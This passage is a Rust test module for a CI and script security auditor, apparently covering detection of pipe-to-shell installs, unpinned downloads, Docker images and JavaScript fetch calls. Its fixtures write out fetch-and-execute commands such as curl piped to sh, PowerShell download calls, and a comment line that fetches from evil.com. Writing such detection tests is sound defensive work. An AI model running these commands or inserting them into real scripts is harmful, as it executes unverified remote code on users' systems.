    fn scan_shell_content_flags_parallel_pipe_to_shell() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - parallel:
          - run: curl https://example.com/install.sh | sh
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for (line, run) in blocks {
            scan_shell_content(&run, "workflow.yml", line, "", &mut c, &DEFAULT_CONFIG);
        }

        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn parallel_control_steps_do_not_create_spurious_findings() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - wait: server
      - parallel:
          - wait: server
          - cancel: server
          - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
          - run: echo safe
      - cancel: server
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for (line, run) in &blocks {
            scan_shell_content(run, "workflow.yml", *line, "", &mut c, &DEFAULT_CONFIG);
        }

        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].1.trim(), "echo safe");
        assert!(c.findings.is_empty());
    }

    #[test]
    fn scan_content_finds_uses_inside_parallel_group() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - parallel:
          - uses: actions/checkout@v4
"#;
        let refs = workflow::scan_content(yaml);

        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].full_name(), "actions/checkout");
    }

    #[test]
    fn extract_run_blocks_recurses_into_nested_parallel() {
        // `parallel:` nested inside `parallel:` — each level is a sequence of
        // steps, walked the same way as the top-level list.
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - parallel:
          - run: echo outer
          - parallel:
              - run: echo inner
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let runs = blocks.iter().map(|(_, run)| run.trim()).collect::<Vec<_>>();

        assert_eq!(runs, vec!["echo outer", "echo inner"]);
    }

    #[test]
    fn extract_run_blocks_flags_backgrounded_service_run() {
        // A `background: true` step keeps its `run:`, so a risky service start
        // must still be scanned.
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Start service
        run: curl https://example.com/install.sh | sh
        background: true
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for (line, run) in blocks {
            scan_shell_content(&run, "workflow.yml", line, "", &mut c, &DEFAULT_CONFIG);
        }

        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_catches_pipe_to_shell_across_continuation() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://example.com/install.sh \\\n  | sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_catches_pipe_to_shell_after_pipeline_newline() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -fsSL https://example.com/releases/download/v1.2.3/install.sh |\n  bash\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_records_one_finding_when_multiple_url_patterns_match() {
        // curl and wget on one line reach the same line-level URL verdict;
        // two findings for the same line would be duplicate noise.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -O https://example.com/a.tar.gz && wget https://example.com/b.tar.gz\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_docker_pull_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "docker pull alpine:latest",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].category, "docker_unpinned");
        assert!(c.findings[0].description.contains("alpine:latest"));
    }

    #[test]
    fn shell_scan_docker_run_untagged_skips_options() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "sudo docker run --rm -v /tmp:/tmp -e FOO=bar alpine echo hi",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].category, "docker_unpinned");
        assert!(c.findings[0].description.contains("alpine"));
    }

    #[test]
    fn shell_scan_docker_run_versioned_or_digest_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "docker run alpine:3.20\ndocker pull ghcr.io/org/app@sha256:aaaaaaaa",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_docker_run_variable_images_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"docker run $MY_IMAGE echo hi
docker run "${{ matrix.image }}" echo hi"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_docker_build_and_compose_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "docker build .\ndocker compose up",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_deno_url_is_finding_when_unversioned() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "deno run --allow-net https://deno.land/x/install/mod.ts",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("deno"));
    }

    #[test]
    fn shell_scan_deno_versioned_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "deno run https://deno.land/x/tool@v1.2.3/mod.ts",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_powershell_bits_and_downloadfile_are_findings() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Start-BitsTransfer -Source https://example.com/tool.ps1 -Destination tool.ps1\n(New-Object Net.WebClient).DownloadFile('https://example.com/tool.exe', 'tool.exe')",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 2);
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("Start-BitsTransfer"))
        );
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("WebClient.DownloadFile"))
        );
    }

    #[test]
    fn shell_scan_non_literal_fetch_to_executable_is_low_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"curl -fsSL "$RELEASE_URL" -o tool"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "low");
        assert!(c.findings[0].description.contains("non-literal source"));
    }

    #[test]
    fn shell_scan_non_literal_fetch_to_data_file_is_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"curl -fsSL "$SCHEMA_URL" -o schema.json"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn shell_scan_non_literal_fetch_to_dev_null_or_later_pipe_redirect_is_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"curl -fsSL "$RELEASE_URL" -o /dev/null
curl -fsSL "$RELEASE_URL" | cat > tool"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pipx_and_uv_tool_unversioned_are_findings() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pipx install poetry\nuv tool install ruff",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 2);
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("pipx install"))
        );
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("uv tool install"))
        );
    }

    #[test]
    fn shell_scan_pipx_and_uv_tool_version_pinned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pipx install poetry==1.8.3\nuv tool install ruff==0.8.0",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_uvx_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "uvx ruff check .",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("uvx"));
    }

    #[test]
    fn shell_scan_uvx_version_pinned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "uvx ruff@0.8.0 check .",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_skips_comment_line_with_cargo_install() {
        // A comment documenting what a sed command matches shouldn't fire —
        // the shell never executes comment-line content.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "# Match `cargo install TOOL --locked`",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_skips_comment_line_with_curl_pipe_to_shell() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "# Example of a bad pattern: curl https://evil.com/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_unversioned_curl_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_latest_curl_emits_single_high_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("'latest' URL"));
    }

    #[test]
    fn shell_scan_latest_wget_emits_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "wget https://example.com/releases/latest/tool.tar.gz",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_latest_iwr_emits_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"Invoke-WebRequest "https://example.com/releases/latest/tool""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_versioned_curl_is_allowed_in_verbose() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/v1.2.3/foo.tar.gz -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_versioned_curl_drops_allowed_when_not_verbose() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/v1.2.3/foo.tar.gz -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn js_scan_versioned_fetch_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/api/1.2.3/data");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
    }

    #[test]
    fn js_scan_unversioned_fetch_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/api/data");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn js_scan_follows_bounded_literal_aliases() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            "const endpoint = `https://example.com/install.sh`;\nconst target = endpoint;\nfetch(target);",
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(
            c.findings[0]
                .description
                .contains("bound to an external URL")
        );
    }

    #[test]
    fn js_scan_invalidates_literal_binding_after_dynamic_reassignment() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            "let endpoint = 'https://example.com/v1.2.3/tool';\nendpoint = process.env.DOWNLOAD_URL;\nfetch(endpoint);",
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
        assert!(c.findings[0].description.contains("could not be verified"));
    }

    #[test]
    fn js_scan_invalidates_literal_binding_after_concatenation() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            "let endpoint = 'https://example.com/v1.2.3/tool';\nendpoint = endpoint + '/../latest/tool';\nfetch(endpoint);",
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
        assert!(c.findings[0].description.contains("could not be verified"));
    }

    #[test]
    fn js_scan_invalidates_literal_binding_after_compound_assignment() {
        for operator in ["+=", "??=", "&&=", "||=", "**=", "<<=", ">>=", ">>>="] {
            let mut c = AuditCollector::new(true);
            scan_js_content(
                &format!(
                    "let endpoint = 'https://example.com/v1.2.3/tool';\nendpoint {operator} '/../latest/tool';\nfetch(endpoint);"
                ),
                "test.js",
                "",
                &mut c,
                &DEFAULT_CONFIG,
            );
            assert_eq!(c.findings.len(), 1, "operator: {operator}");
            assert!(c.allowed.is_empty(), "operator: {operator}");
            assert!(
                c.findings[0].description.contains("could not be verified"),
                "operator: {operator}"
            );
        }
    }

    #[test]
    fn js_scan_does_not_treat_comparison_or_arrow_as_assignment() {
        let mut bindings = HashMap::from([(
            "endpoint".to_string(),
            "https://example.com/v1.2.3/tool".to_string(),
        )]);
        update_literal_url_binding("endpoint === candidate", &mut bindings);
        update_literal_url_binding("endpoint => endpoint", &mut bindings);
        assert_eq!(
            bindings.get("endpoint").map(String::as_str),
            Some("https://example.com/v1.2.3/tool")
        );
    }

    #[test]
    fn js_scan_interpolated_template_fetch_is_dynamic() {
        let mut c = AuditCollector::new(false);
        scan_js_content(
            "fetch(`${base}/latest/tool`);",
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("latest"));
    }

    #[test]
    fn js_scan_requires_a_lexical_sink_name() {
        let mut c = AuditCollector::new(false);
        scan_js_content(
            "forgot(endpoint); const text = 'fetch(endpoint)'; function fetch(value) {}",
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn js_scan_checks_qualified_and_later_same_line_sinks() {
        let mut c = AuditCollector::new(false);
        scan_js_content(
            "fetch('https://example.com/v1.2.3/metadata'); globalThis.fetch(process.env.PAYLOAD_URL);",
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("could not be verified"));
    }

    #[test]
    fn js_scan_skips_unresolved_sinks_in_minified_bundles() {
        let mut c = AuditCollector::new(false);
        let content = format!("{};fetch(e,t)", "x".repeat(MINIFIED_LINE_THRESHOLD + 1));
        scan_js_content(&content, "dist/index.js", "", &mut c, &DEFAULT_CONFIG);
        assert!(c.findings.is_empty());
    }

    #[test]
    fn js_scan_skips_unresolved_sinks_in_compiled_distribution_files() {
        let mut c = AuditCollector::new(false);
        scan_js_content(
            "fetch(endpoint);",
            "owner/action (dist/index.js)",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn js_scan_recognizes_esbuild_bundle_outside_dist() {
        let mut c = AuditCollector::new(false);
        let bundle = "var __esm = helper;\nvar __commonJS = helper;\nvar __toESM = helper;\n// node_modules/client/index.js\nfetch(endpoint);";
        scan_js_content(
            bundle,
            "owner/action (lib/entry-points.js)",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());

        let mut literal = AuditCollector::new(false);
        let bundle = "var __esm = helper;\nvar __commonJS = helper;\nvar __toESM = helper;\n// node_modules/client/index.js\nconst endpoint = 'https://example.com/latest/tool';\nfetch(endpoint);";
        scan_js_content(
            bundle,
            "owner/action (lib/entry-points.js)",
            "",
            &mut literal,
            &DEFAULT_CONFIG,
        );
        assert_eq!(literal.findings.len(), 1);

        let mut inert_comments = AuditCollector::new(false);
        scan_js_content(
            "// var __esm = helper;\n// var __commonJS = helper;\n// var __toESM = helper;\nfetch(process.env.URL);",
            "owner/action (lib/client.js)",
            "",
            &mut inert_comments,
            &DEFAULT_CONFIG,
        );
        assert_eq!(inert_comments.findings.len(), 1);

        let mut inert_template = AuditCollector::new(false);
        scan_js_content(
            "const fixture = `\nvar __esm = helper;\nvar __commonJS = helper;\nvar __toESM = helper;\n`;\nfetch(process.env.URL);",
            "owner/action (lib/client.js)",
            "",
            &mut inert_template,
            &DEFAULT_CONFIG,
        );
        assert_eq!(inert_template.findings.len(), 1);

        let mut inert_nested_template = AuditCollector::new(false);
        scan_js_content(
            r#"const fixture = `${`
var __esm = helper;
var __commonJS = helper;
var __toESM = helper;
`}`;
fetch(process.env.URL);"#,
            "owner/action (lib/client.js)",
            "",
            &mut inert_nested_template,
            &DEFAULT_CONFIG,
        );
        assert_eq!(inert_nested_template.findings.len(), 1);

        let mut inert_nested_template_with_regex = AuditCollector::new(false);
        scan_js_content(
            r#"const fixture = `${/}/ && `
var __esm = helper;
var __commonJS = helper;
var __toESM = helper;
`}`;
fetch(process.env.URL);"#,
            "owner/action (lib/client.js)",
            "",
            &mut inert_nested_template_with_regex,
            &DEFAULT_CONFIG,
        );
        assert_eq!(inert_nested_template_with_regex.findings.len(), 1);

        let mut inert_dead_code = AuditCollector::new(false);
        scan_js_content(
            "if (false) {\nvar __esm = helper;\nvar __commonJS = helper;\nvar __toESM = helper;\n}\nfetch(process.env.URL);",
            "owner/action (lib/client.js)",
            "",
            &mut inert_dead_code,
            &DEFAULT_CONFIG,
        );
        assert_eq!(inert_dead_code.findings.len(), 1);

        let mut inert_dead_code_with_regex = AuditCollector::new(false);
        scan_js_content(
            "if (false) {\n/}/;\nvar __esm = helper;\nvar __commonJS = helper;\nvar __toESM = helper;\n}\nfetch(process.env.URL);",
            "owner/action (lib/client.js)",
            "",
            &mut inert_dead_code_with_regex,
            &DEFAULT_CONFIG,
        );
        assert_eq!(inert_dead_code_with_regex.findings.len(), 1);
    }

    #[test]
    fn js_scan_follows_literal_binding_in_compiled_distribution_files() {
        let mut c = AuditCollector::new(false);
        scan_js_content(
            "const endpoint = 'https://example.com/latest/tool';\nfetch(endpoint);",
            "owner/action (dist/index.js)",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(
            c.findings[0]
                .description
                .contains("bound to an external URL")
        );
    }

    #[test]
    fn js_scan_follows_literal_binding_on_minified_line() {
        let mut c = AuditCollector::new(false);
        let content = format!(
            "const endpoint='https://example.com/latest/tool';{};fetch(endpoint)",
            "x".repeat(MINIFIED_LINE_THRESHOLD + 1)
        );
        scan_js_content(&content, "dist/index.js", "", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
        assert!(
            c.findings[0]
                .description
                .contains("bound to an external URL")
        );
    }

    #[test]
    fn js_scan_compiled_binding_analysis_handles_generated_syntax() {
        for source in [
            "const a=0,endpoint='https://example.com/install';fetch(endpoint)",
            "const $u='https://example.com/install';fetch($u)",
            "const u='https:\\x2f\\x2fexample.com/install';fetch(u)",
            "const u='https:\\u002f\\u002fexample.com/install';fetch(u)",
            "const u='https:\\u{2f}\\u{2f}example.com/install';fetch(u)",
            "const endpoint='https://example.com/install';fetch (endpoint)",
            "const endpoint='https://example.com/install';axios.get /* call */ (endpoint)",
        ] {
            let mut c = AuditCollector::new(true);
            scan_js_content(
                source,
                "owner/action (dist/index.js)",
                "",
                &mut c,
                &DEFAULT_CONFIG,
            );
            assert_eq!(c.findings.len(), 1, "source: {source}");
            assert!(c.allowed.is_empty(), "source: {source}");
        }
    }

    #[test]
    fn js_scan_escaped_direct_literal_and_template_expression_are_scanned() {
        for source in [
            "fetch('https:\\x2f\\x2fexample.com/install')",
            "const endpoint='https://example.com/install';const result=`${fetch(endpoint)}`;",
        ] {
            let mut c = AuditCollector::new(false);
            scan_js_content(
                source,
                "owner/action (dist/index.js)",
                "",
                &mut c,
                &DEFAULT_CONFIG,
            );
            assert_eq!(c.findings.len(), 1, "source: {source}");
        }

        let mut inert = AuditCollector::new(false);
        scan_js_content(
            "const endpoint='https://example.com/install';const text=`fetch(endpoint)`;",
            "owner/action (dist/index.js)",
            "",
            &mut inert,
            &DEFAULT_CONFIG,
        );
        assert!(inert.findings.is_empty());
    }

    #[test]
    fn js_scan_compiled_binding_invalidation_is_scope_and_comment_aware() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            "const endpoint='https://example.com/install';\n// endpoint = sanitize(endpoint)\nfunction f(endpoint) { return endpoint; }\nmalfunction(endpoint);\nfetch(endpoint);",
            "owner/action (dist/index.js)",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());

        for shadow in [
            "const endpoint='https://example.com/v1.2.3/tool';const f=(endpoint)=>fetch(endpoint);",
            "const endpoint='https://example.com/v1.2.3/tool';const f=({endpoint})=>fetch(endpoint);",
        ] {
            let mut c = AuditCollector::new(true);
            scan_js_content(
                shadow,
                "owner/action (dist/index.js)",
                "",
                &mut c,
                &DEFAULT_CONFIG,
            );
            assert!(c.findings.is_empty(), "source: {shadow}");
            assert!(c.allowed.is_empty(), "source: {shadow}");
        }

        for outer_reference in [
            "const endpoint='https://example.com/install';function f(unused=endpoint){fetch(endpoint)}f();",
            "const key='https://example.com/install';function f({key: local}){fetch(key)}f({});",
        ] {
            let mut c = AuditCollector::new(false);
            scan_js_content(
                outer_reference,
                "owner/action (dist/index.js)",
                "",
                &mut c,
                &DEFAULT_CONFIG,
            );
            assert_eq!(c.findings.len(), 1, "source: {outer_reference}");
        }

        let mut typed_shadow = AuditCollector::new(true);
        scan_js_content(
            "const local='https://example.com/v1.2.3/tool';function f({key: local, other}: Props){fetch(local)};f(input);",
            "owner/action (dist/index.js)",
            "",
            &mut typed_shadow,
            &DEFAULT_CONFIG,
        );
        assert!(typed_shadow.findings.is_empty());
        assert!(typed_shadow.allowed.is_empty());

        let mut chained = AuditCollector::new(true);
        scan_js_content(
            "const endpoint='https://example.com/v1.2.3/tool';sink = endpoint = process.env.URL;fetch(endpoint);",
            "owner/action (dist/index.js)",
            "",
            &mut chained,
            &DEFAULT_CONFIG,
        );
        assert!(chained.allowed.is_empty());

        for shadow in [
            "const endpoint='https://example.com/v1.2.3/tool';class A { m(endpoint) { fetch(endpoint); } }",
            "const endpoint='https://example.com/v1.2.3/tool';\nfunction f(\n endpoint\n) {\n fetch(endpoint);\n}",
        ] {
            let mut c = AuditCollector::new(true);
            scan_js_content(
                shadow,
                "owner/action (dist/index.js)",
                "",
                &mut c,
                &DEFAULT_CONFIG,
            );
            assert!(c.findings.is_empty(), "source: {shadow}");
            assert!(c.allowed.is_empty(), "source: {shadow}");
        }
    }

    #[test]
    fn js_scan_compiled_multiline_bound_sink_is_not_suppressed() {
        let mut c = AuditCollector::new(false);
        scan_js_content(
            "const endpoint='https://example.com/install';\nfetch(\n  endpoint\n);",
            "owner/action (dist/index.js)",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);

        let mut parenthesized = AuditCollector::new(false);
        scan_js_content(
            "const endpoint='https://example.com/install';\nfetch(\n (\n endpoint\n));",
            "owner/action (dist/index.js)",
            "",
            &mut parenthesized,
            &DEFAULT_CONFIG,
        );
        assert_eq!(parenthesized.findings.len(), 1);

        let mut direct = AuditCollector::new(false);
        scan_js_content(
            "fetch(\n  'https://example.com/install'\n);",
            "owner/action (dist/index.js)",
            "",
            &mut direct,
            &DEFAULT_CONFIG,
        );
        assert_eq!(direct.findings.len(), 1);

        let mut versioned = AuditCollector::new(true);
        scan_js_content(
            "const endpoint='https://example.com/v1.2.3/tool';\nfetch(\n  endpoint\n);",
            "owner/action (dist/index.js)",
            "",
            &mut versioned,
            &DEFAULT_CONFIG,
        );
        assert!(versioned.findings.is_empty());
        assert_eq!(versioned.allowed.len(), 1);
    }

    #[test]
    fn js_scan_multiline_sinks_wait_for_their_first_argument() {
        for source in [
            "fetch(\n  'https://example.com/v1.2.3/tool',\n  options\n);",
            "const endpoint = 'https://example.com/v1.2.3/tool';\nfetch(\n  endpoint,\n  options\n);",
        ] {
            let mut c = AuditCollector::new(true);
            scan_js_content(source, "src/index.js", "", &mut c, &DEFAULT_CONFIG);
            assert!(c.findings.is_empty(), "source: {source}");
            assert_eq!(c.allowed.len(), 1, "source: {source}");
        }

        for source in [
            "fetch(\n  'https://example.com/tool',\n  options\n);",
            "const endpoint = 'https://example.com/tool';\nfetch(\n  endpoint,\n  options\n);",
        ] {
            let mut c = AuditCollector::new(false);
            scan_js_content(source, "src/index.js", "", &mut c, &DEFAULT_CONFIG);
            assert_eq!(c.findings.len(), 1, "source: {source}");
            assert_eq!(
                c.findings[0].line,
                Some(if source.starts_with("fetch") { 1 } else { 2 }),
                "source: {source}"
            );
        }

        for source in [
            "fetch(\n  'https://example.com/releases/latest/tool'\n);",
            "const endpoint = 'https://example.com/releases/latest/tool';\nfetch(\n  endpoint\n);",
            "fetch(\n  'https://example.com/v1.2.3/releases/' +\n  'latest/tool'\n);",
        ] {
            let mut c = AuditCollector::new(false);
            scan_js_content(source, "src/index.js", "", &mut c, &DEFAULT_CONFIG);
            assert_eq!(c.findings.len(), 1, "source: {source}");
            assert_eq!(c.findings[0].severity, "high", "source: {source}");
        }

        let mut shadowed = AuditCollector::new(true);
        scan_js_content(
            "const endpoint = 'https://example.com/v1.2.3/tool';\nfunction load(endpoint) {\n  fetch(\n    endpoint\n  );\n}",
            "src/index.js",
            "",
            &mut shadowed,
            &DEFAULT_CONFIG,
        );
        assert_eq!(shadowed.findings.len(), 1);
        assert!(shadowed.allowed.is_empty());

        for arrow in [
            "const endpoint = 'https://example.com/v1.2.3/tool';\nconst load = endpoint =>\n  fetch(\n    endpoint\n  );",
            "const endpoint = 'https://example.com/v1.2.3/tool';\nconst load = (endpoint) =>\n  fetch(\n    endpoint\n  );",
        ] {
            let mut c = AuditCollector::new(true);
            scan_js_content(arrow, "src/index.js", "", &mut c, &DEFAULT_CONFIG);
            assert_eq!(c.findings.len(), 1, "source: {arrow}");
            assert!(c.allowed.is_empty(), "source: {arrow}");
        }
    }

    #[test]
    fn js_scan_keeps_unresolved_sinks_in_typescript_source() {
        let mut c = AuditCollector::new(false);
        scan_js_content(
            "fetch(endpoint);",
            "owner/action (src/index.ts)",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn js_scan_marks_unresolved_dynamic_fetch_as_a_finding() {
        let mut c = AuditCollector::new(false);
        scan_js_content(
            "fetch(process.env.DOWNLOAD_URL);",
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("could not be verified"));
    }

    #[test]
    fn js_scan_marks_multiline_fetch_as_unresolved() {
        let mut c = AuditCollector::new(false);
        scan_js_content(
            "fetch(\n  endpoint\n);",
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn js_scan_unversioned_got_and_http_get_are_findings() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"
const a = await got("https://example.com/api/data");
http.get("http://example.com/install.sh", cb);
https.get("https://example.com/install.sh", cb);
"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 3);
